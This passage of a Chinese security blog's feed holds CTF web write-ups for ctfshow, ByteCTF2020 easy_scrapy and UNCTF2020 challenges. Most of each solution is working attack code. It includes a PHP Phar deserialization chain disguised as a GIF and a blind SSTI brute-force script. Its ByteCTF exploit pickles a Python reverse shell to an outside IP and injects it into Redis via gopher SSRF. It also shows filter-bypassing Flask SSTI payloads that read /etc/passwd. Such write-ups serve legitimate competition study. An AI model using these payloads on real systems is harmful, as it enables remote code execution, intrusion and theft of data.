class="string">&quot;这个文件我不喜欢，我喜欢一个gif的文件&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>Readfile.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">$filename</span>)</span>&#123;  </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/^phar|^smtp|^dict|^zip|file|etc|root|filter|\.\.\//i&quot;</span>,$filename))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;姿势太简单啦，来一点骚的？！&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">    $file=$_GET[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(strstr($file, <span class="string">&quot;flag&quot;</span>) || check($file) || strstr($file, <span class="string">&quot;php&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;这么简单的获得不可能吧？！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> readfile($file);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>unlink.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$file=$_GET[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">$file</span>)</span>&#123;  </span><br><span class="line">  <span class="keyword">if</span> (preg_match(<span class="string">&quot;/\.\.\//i&quot;</span>,$file))&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;你想干什么？！&quot;</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> $file;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(file_exists(<span class="string">&quot;upload/&quot;</span>.$file))&#123;</span><br><span class="line">      <span class="keyword">if</span>(unlink(<span class="string">&quot;upload/&quot;</span>.check($file)))&#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;删除&quot;</span>.$file.<span class="string">&quot;成功！&quot;</span>;</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;删除&quot;</span>.$file.<span class="string">&quot;失败！&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;要删除的文件不存在！&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$a</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = $a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;THI IS CTFSHOW&quot;</span>.<span class="keyword">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$b</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = $b;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;b)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $c;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$c</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;c = $c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>有反序列化有上传，应该就是PHP反序列化+Phar上传。构造这个POP链还是比较简单的：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;phar.readonly&#x27;</span>,<span class="string">&#x27;Off&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$a</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = $a;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$b</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = $b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $c;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$c</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;c = $c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//@unlink(&quot;phar1.phar&quot;);//unlink() 函数删除文件。</span></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">$phar-&gt;startBuffering();<span class="comment">//开始缓冲Phar写操作</span></span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">$A = <span class="keyword">new</span> A(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">$B = <span class="keyword">new</span> B(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">$C = <span class="keyword">new</span> C(<span class="string">&#x27;system(&quot;cat /ctfshow_1024_flag.txt&quot;);&#x27;</span>);</span><br><span class="line">$A-&gt;a=$B;</span><br><span class="line">$B-&gt;b=$C;</span><br><span class="line">$phar-&gt;setMetadata($A);<span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);<span class="comment">//以字符串的形式添加一个文件到phar档案添 加要压缩的文件 //签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="comment">//compress.zlib://phar://xxx</span></span><br><span class="line"><span class="comment">//compress.zlib://phar://1.gif</span></span><br></pre></td></tr></table></figure>
<p>更改后缀名为gif上传，再在readfile界面使用伪协议<code>compress.zlib://phar://upload/phar.gif</code>执行命令。</p>
<h2 id="hello-world">hello_world</h2>
<p>考察SSTI盲注，使用<code>\x5f</code>绕过</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;&quot;&quot;http://7f6bd375-3951-484c-8ad4-b212bc83b878.chall.ctf.show/&quot;&quot;&quot;</span></span><br><span class="line">strings = string.digits + string.ascii_lowercase + <span class="string">&#x27;-&#x27;</span> + <span class="string">&#x27;&#123;&#x27;</span> + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">flag = <span class="string">&quot;ca01h&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> strings:</span><br><span class="line">        payload = <span class="string">&#x27;&#x27;&#x27;&#123;% set chr=&quot;&quot;[&quot;\\x5f\\x5fclass\\x5f\\x5f&quot;][&quot;\\x5F\\x5Fbase\\x5F\\x5F&quot;][&quot;\\x5F\\x5Fsubclasses\\x5F\\x5F&quot;]()[65] [&quot;\\x5F\\x5Finit\\x5F\\x5F&quot;][&quot;\\x5F\\x5Fglobals\\x5F\\x5F&quot;] [&quot;\\x5F\\x5Fbuiltins\\x5F\\x5F&quot;][&quot;chr&quot;] %&#125;&#123;% if &quot;&quot; [&quot;\\x5f\\x5fclass\\x5f\\x5f&quot;][&quot;\\x5F\\x5Fbase\\x5F\\x5F&quot;] [&quot;\\x5F\\x5Fsubclasses\\x5F\\x5F&quot;]()[65][&quot;\\x5F\\x5Finit\\x5F\\x5F&quot;] [&quot;\\x5F\\x5Fglobals\\x5F\\x5F&quot;][&quot;\\x5F\\x5Fbuiltins\\x5F\\x5F&quot;][&quot;eval&quot;](&quot;\\x5F\\x5Fimport\\x5F\\x5F(chr(111)+chr(115))&quot;)[chr(112)+chr(111)+chr(112)+chr(101)+chr(110)](chr(99)+chr(97)+chr(116)+chr(32)+chr(47)+chr(99)+chr(42))[&quot;read&quot;]() [&#x27;&#x27;&#x27;</span>+str(i)+<span class="string">&#x27;&#x27;&#x27;]==&quot;&#x27;&#x27;&#x27;</span>+s+<span class="string">&#x27;&#x27;&#x27;&quot; %&#125; ca01h&#123;% endif %&#125;&#x27;&#x27;&#x27;</span></span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        res = requests.post(url, data=&#123;<span class="string">&quot;key&quot;</span>: payload&#125;)</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> res.text:</span><br><span class="line">            print(s)</span><br><span class="line">            result += s</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> result[<span class="number">-1</span>] == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>ByteCTF2020-scrapy_redis复现</title>
    <url>/Web_security/ctf_writeup/26.ByteCTF2020-scrapy-redis%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="ByteCTF2020复现">ByteCTF2020复现</h1>
<p>这web题目出的简直就是神仙。。</p>
<h2 id="easy-scrapy">easy_scrapy</h2>
<p>首页是一个可以提交URL的输入框，验证码给出了md5加密后的前5位，可以直接写Python脚本爆破。添加数据的时候，在VPS监听端口：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201102143549.png" alt=""></p>
<p>从上图中可以看出使用的是scrapy+redis，应该是url数据会存储在Redis中，然后用scrapy爬虫爬取。</p>
<p>添加完数据后，在MyUrlList中会显示数据，点击记录，发现会访问<code>http://101.200.50.18:30010/result?url=http://xx.xx.xxx.xx:8888/</code>，可能存在SSRF，监听端口：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201102141039.png" alt=""></p>
<p>后面<code>/result?url</code>则是用了另一种功能进行pycurl的请求，类似于<code>curl</code>，同样支持使用Gopher协议。</p>
<p>复现时候也用SSRF常见利用方式探测端口以及Redis的服务信息，但是没有什么收获。</p>
<p>转变一下思路，既然是爬虫，那么遇到<code>&lt;a&gt;</code>标签，他就有可能去请求：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201104155454.png" alt=""></p>
<p>既然是这样，那么就可以把<code>&lt;a&gt;</code>标签的href改成file协议造成任意文件读取：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201104162527.png" alt=""></p>
<p>OK，验证成功。那么这样的话，就可以读取题目的爬虫源码，但是在读之前，需要知道爬虫源码的绝对路径。可以通过读取<code>/etc/self/environ</code>得到工作路径</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201104170859.png" alt=""></p>
<p>显示当前<code>PWD=/code</code>，但是我们还不知道项目结构，可以去<a href="https://scrapy-chs.readthedocs.io/zh_CN/0.24/intro/tutorial.html">官方文档</a>中找到这个爬虫框架的结构：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tutorial&#x2F;</span><br><span class="line">    scrapy.cfg</span><br><span class="line">    tutorial&#x2F;</span><br><span class="line">        __init__.py</span><br><span class="line">        items.py</span><br><span class="line">        pipelines.py</span><br><span class="line">        settings.py</span><br><span class="line">        spiders&#x2F;</span><br><span class="line">            __init__.py</span><br><span class="line">            ...</span><br></pre></td></tr></table></figure>
<p>这些文件分别是:</p>
<ul>
<li><code>scrapy.cfg</code>: 项目的配置文件</li>
<li><code>tutorial/</code>: 该项目的python模块。之后您将在此加入代码。</li>
<li><code>tutorial/items.py</code>: 项目中的item文件.</li>
<li><code>tutorial/pipelines.py</code>: 项目中的pipelines文件.</li>
<li><code>tutorial/settings.py</code>: 项目的设置文件.</li>
<li><code>tutorial/spiders/</code>: 放置spider代码的目录.</li>
</ul>
<p>首先去看项目配置文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Automatically created by: scrapy startproject</span><br><span class="line">#</span><br><span class="line"># For more information about the [deploy] section see:</span><br><span class="line"># https:&#x2F;&#x2F;scrapyd.readthedocs.io&#x2F;en&#x2F;latest&#x2F;deploy.html</span><br><span class="line"></span><br><span class="line">[settings]</span><br><span class="line">default &#x3D; bytectf.settings</span><br><span class="line"></span><br><span class="line">[deploy]</span><br><span class="line">#url &#x3D; http:&#x2F;&#x2F;localhost:6800&#x2F;</span><br><span class="line">project &#x3D; bytectf</span><br></pre></td></tr></table></figure>
<p>得知项目名是<code>bytectf</code>，但是还需要知道<code>bytectf</code>文件夹下的<code>spiders</code>的爬虫文件名。</p>
<p>读取<code>/proc/self/cmdline</code>，这个文件包含进程的完整命令行信息，我们可以根据他来得知正在运行的爬虫的文件名称。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;usr&#x2F;local&#x2F;bin&#x2F;python &#x2F;usr&#x2F;local&#x2F;bin&#x2F;scrapy crawl byte</span><br></pre></td></tr></table></figure>
<p>那么当前的爬虫名字是byte。</p>
<p>读取源码，得到结构如下：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201104172101.png" alt=""></p>
<p>通过piplelines.py和settings.py分别得到了MongoDB和Redis的配置</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">//pipelines.py</span><br><span class="line"><span class="keyword">import</span> pymongo</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BytectfPipeline</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line"></span><br><span class="line">        MONGODB_HOST = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">        MONGODB_PORT = <span class="number">27017</span></span><br><span class="line">        MONGODB_DBNAME = <span class="string">&#x27;result&#x27;</span></span><br><span class="line">        MONGODB_TABLE = <span class="string">&#x27;result&#x27;</span></span><br><span class="line">        MONGODB_USER = <span class="string">&#x27;N0rth3&#x27;</span></span><br><span class="line">        MONGODB_PASSWD = <span class="string">&#x27;E7B70D0456DAD39E22735E0AC64A69AD&#x27;</span></span><br><span class="line">        mongo_client = pymongo.MongoClient(<span class="string">&quot;%s:%d&quot;</span> % (MONGODB_HOST, MONGODB_PORT))</span><br><span class="line">        mongo_client[MONGODB_DBNAME].authenticate(MONGODB_USER, MONGODB_PASSWD, MONGODB_DBNAME)</span><br><span class="line">        mongo_db = mongo_client[MONGODB_DBNAME]</span><br><span class="line">        self.table = mongo_db[MONGODB_TABLE]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_item</span>(<span class="params">self, item, spider</span>):</span></span><br><span class="line"></span><br><span class="line">        quote_info = dict(item)</span><br><span class="line">        print(quote_info)</span><br><span class="line">        self.table.insert(quote_info)</span><br><span class="line">        <span class="keyword">return</span> item</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">//settings.py</span><br><span class="line">BOT_NAME = <span class="string">&#x27;bytectf&#x27;</span></span><br><span class="line">SPIDER_MODULES = [<span class="string">&#x27;bytectf.spiders&#x27;</span>]</span><br><span class="line">NEWSPIDER_MODULE = <span class="string">&#x27;bytectf.spiders&#x27;</span></span><br><span class="line">RETRY_ENABLED = <span class="literal">False</span></span><br><span class="line">ROBOTSTXT_OBEY = <span class="literal">False</span></span><br><span class="line">DOWNLOAD_TIMEOUT = <span class="number">8</span></span><br><span class="line">USER_AGENT = <span class="string">&#x27;scrapy_redis&#x27;</span></span><br><span class="line">SCHEDULER = <span class="string">&quot;scrapy_redis.scheduler.Scheduler&quot;</span></span><br><span class="line">DUPEFILTER_CLASS = <span class="string">&quot;scrapy_redis.dupefilter.RFPDupeFilter&quot;</span></span><br><span class="line">REDIS_HOST = <span class="string">&#x27;172.20.0.7&#x27;</span></span><br><span class="line">REDIS_PORT = <span class="number">6379</span></span><br><span class="line">ITEM_PIPELINES = &#123;</span><br><span class="line"> <span class="string">&#x27;bytectf.pipelines.BytectfPipeline&#x27;</span>: <span class="number">300</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以及主要的爬虫逻辑</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> scrapy_redis.spiders <span class="keyword">import</span> RedisSpider</span><br><span class="line"><span class="keyword">from</span> bytectf.items <span class="keyword">import</span> BytectfItem</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ByteSpider</span>(<span class="params">RedisSpider</span>):</span></span><br><span class="line">    name = <span class="string">&#x27;byte&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        byte_item = BytectfItem()</span><br><span class="line">        byte_item[<span class="string">&#x27;byte_start&#x27;</span>] = response.request.url</span><br><span class="line">        url_list = []</span><br><span class="line">        test = response.xpath(<span class="string">&#x27;//a/@href&#x27;</span>).getall()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> test:</span><br><span class="line">            <span class="keyword">if</span> i[<span class="number">0</span>] == <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">                url = response.request.url + i</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                url = i</span><br><span class="line">            <span class="keyword">if</span> re.search(<span class="string">r&#x27;://&#x27;</span>,url):</span><br><span class="line">                r = scrapy.Request(url,callback=self.parse2,dont_filter=<span class="literal">True</span>)</span><br><span class="line">                r.meta[<span class="string">&#x27;item&#x27;</span>] = byte_item</span><br><span class="line">                <span class="keyword">yield</span> r</span><br><span class="line">            url_list.append(url)</span><br><span class="line">            <span class="keyword">if</span>(len(url_list)&gt;<span class="number">3</span>):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        byte_item[<span class="string">&#x27;byte_url&#x27;</span>] = response.request.url</span><br><span class="line">        byte_item[<span class="string">&#x27;byte_text&#x27;</span>] = base64.b64encode((response.text).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">yield</span> byte_item</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse2</span>(<span class="params">self,response</span>):</span></span><br><span class="line">        item = response.meta[<span class="string">&#x27;item&#x27;</span>]</span><br><span class="line">        item[<span class="string">&#x27;byte_url&#x27;</span>] = response.request.url</span><br><span class="line">        item[<span class="string">&#x27;byte_text&#x27;</span>] = base64.b64encode((response.text).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">yield</span> item</span><br></pre></td></tr></table></figure>
<p>到这里，我用<a href="https://bycsec.top/">byc404</a>写好的docker-compose在本地起爬虫，跟线上的bot+redis+mongo环境基本一致。</p>
<blockquote>
<p><a href="https://blog.csdn.net/zwq912318834/article/details/78854571">https://blog.csdn.net/zwq912318834/article/details/78854571</a></p>
</blockquote>
<blockquote>
<p>Github上的环境缺一个文件，需要在<code>easyscrapy/python/bytectf/spiders</code>加一个<code>__init__.py</code>文件。不然scrapy会报没有spiders库。</p>
</blockquote>
<p>三个containers启动了之后可以看到爬虫服务已经start了。Redis在本机也映射到了6379端口，进入Redis容器可以看到现在没有keys：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201105194319.png" alt=""></p>
<p><a href="http://xn--fill-z94fz69b9j1ahda5675ayyp.py">在本机上运行fill.py</a>，需要提前安装<code>https://github.com/wuchengwei0122/redis-py.git</code></p>
<p>相当于向Redis循环200次添加<code>start_urls:http//baidu.com</code>，这个时候就可以看到<code>byte:requests</code>键存在序列化数据：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201105202111.png" alt=""></p>
<p>那么利用链就是想办法写入<code>byte:requests</code>键，内容为序列化数据，而写入的方法就是pycurl的SSRF，利用Gopher协议打Redis。</p>
<p>贴一个官方的exp，用python3生成poc，反弹shell：</p>
<blockquote>
<p>由于<code>byte:requests</code>有序列表是zset，需要在Redis上执行ZADD命令。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        s = <span class="string">&quot;&quot;&quot;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;119.45.184.10&quot;,7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (s,))</span><br><span class="line"></span><br><span class="line">test = str(pickle.dumps(exp()))</span><br><span class="line">poc = test.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&#x27;\\n&#x27;</span>).replace(<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;\\\&quot;&quot;</span>)[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line">poc =<span class="string">&#x27;gopher://172.20.0.7:6379/_&#x27;</span>+quote(<span class="string">&#x27;ZADD byte:requests 0 &quot;&#x27;</span>)+quote(poc)+quote(<span class="string">&#x27;&quot;&#x27;</span>)</span><br><span class="line">print(poc)</span><br></pre></td></tr></table></figure>
<p>用GET打过去的时候需要二次URL编码。</p>
<p>参考文章：</p>
<p><a href="https://northity.com/2020/10/30/ByteCTF%E5%88%9D%E8%B5%9B%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/">https://northity.com/2020/10/30/ByteCTF初赛出题笔记/</a></p>
<p><a href="http://blog.ccreater.top/2020/10/26/2020ByteCTF/">http://blog.ccreater.top/2020/10/26/2020ByteCTF/</a></p>
<p><a href="https://www.jianshu.com/p/0823666a7687">https://www.jianshu.com/p/0823666a7687</a></p>
<p><a href="https://blog.csdn.net/zwq912318834/article/details/78854571">https://blog.csdn.net/zwq912318834/article/details/78854571</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>UNCTF2020-Web-Writeup</title>
    <url>/Web_security/ctf_writeup/27.UNCTF2020-Web-Writeup/</url>
    <content><![CDATA[<h1 id="UNCTF2020-Web-wp">UNCTF2020 Web wp</h1>
<h2 id="easyssrf-solved">easyssrf [solved]</h2>
<p>算是签到题，比较easy</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unctf.com&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</span><br></pre></td></tr></table></figure>
<h2 id="easyflask-solved">easyflask [solved]</h2>
<p>Fuzz了一下，发现过滤挺多东西的。<br>
只能用管道+join的方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)&#125;&#125;&amp;class&#x3D;class&amp;usc&#x3D;_</span><br></pre></td></tr></table></figure>
<p>等价于<code>().__class__</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.base,request.args.usc*2)|join)&#125;&#125;&amp;class&#x3D;class&amp;usc&#x3D;_&amp;base&#x3D;base</span><br></pre></td></tr></table></figure>
<p>等价于<code>().__class__.__base__</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.base,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.subclasses,request.args.usc*2)|join)()&#125;&#125;&amp;class&#x3D;class&amp;usc&#x3D;_&amp;base&#x3D;base&amp;subclasses&#x3D;subclasses</span><br></pre></td></tr></table></figure>
<p><code>().__class__.__base__.subclasses()</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;(()|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.base,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.subclasses,request.args.usc*2)|join)()).pop(475)&#125;</span><br></pre></td></tr></table></figure>
<p><code>().__class__.base__.subclasses().pop(475)</code><br>
click.utils.LazyFile</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;(()|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.base,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.subclasses,request.args.usc*2)|join)()).pop(475)(request.args.path).read()&#125;&#125;&amp;class&#x3D;class&amp;usc&#x3D;_&amp;base&#x3D;base&amp;subclasses&#x3D;subclasses&amp;path&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
<p>但是不知道flag在哪，所以还是要执行系统命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;(()|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.base,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.subclasses,request.args.usc*2)|join)()).pop(64)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>选取的模块<code>&lt;class '_frozen_importlib._DummyModuleLock'&gt;</code></p>
